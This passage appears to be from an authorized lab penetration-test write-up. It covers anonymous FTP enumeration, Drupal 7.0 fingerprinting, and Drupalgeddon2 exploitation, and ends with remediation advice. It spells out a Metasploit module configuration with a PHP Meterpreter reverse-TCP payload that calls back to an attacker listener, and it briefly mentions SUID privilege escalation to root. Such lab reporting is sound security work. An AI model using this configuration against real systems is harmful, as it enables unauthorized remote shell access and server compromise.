2. Anonymous FTP Enumeration

Anonymous FTP access was identified. The exposed files were enumerated and a packet capture was obtained for analysis.

3. HTTP / Drupal Enumeration

The HTTP service hosted a Drupal 7.0 installation. The Drupal CHANGELOG confirmed the old 7.0 release. 


curl -s http://10.0.1.8/

The Drupal installation was identified as vulnerable to the HTTP Drupalgeddon vulnerability used in the lab.

4. HTTP Drupalgeddon Exploitation

Metasploit was used to exploit the vulnerable Drupal HTTP service. The successful payload configuration used a PHP Meterpreter Reverse TCP payload. 


use exploit/unix/webapp/drupal_drupalgeddon2



set RHOSTS 10.0.1.8

set RPORT 80

set TARGETURI /



set LHOST 10.0.1.4

set LPORT 4444



set payload php/meterpreter/reverse_tcp



run

The module reported: 


[+] The target appears to be vulnerable.
Exploit Payload Listener
HTTP Drupalgeddon php/meterpreter/reverse_tcp 10.0.1.4:4444

16. Recommendations

  • Upgrade the Drupal installation and apply current security patches.
  • Disable anonymous FTP access unless explicitly required.
  • Restrict access to packet captures and sensitive files.
  • Rotate all credentials discovered during the assessment.
  • Remove unnecessary SUID permissions.
  • Audit custom SUID executables before granting elevated privileges.
  • Replace weak passwords with strong unique credentials.
  • Review NOPASSWD sudo rules and apply least privilege.
  • Protect Drupal configuration files and database credentials.

17. Conclusion

The HSBox assessment demonstrated an attack path beginning with service enumeration and exposed FTP access, followed by exploitation of the HTTP Drupal installation using the Drupalgeddon exploit and a PHP Meterpreter Reverse TCP payload.

Initial access was obtained as www-data, followed by local enumeration and privilege escalation through a custom SUID executable. Root access enabled further flag, credential, and sudo configuration enumeration.

Assessment completed in the authorized HSBox lab environment.
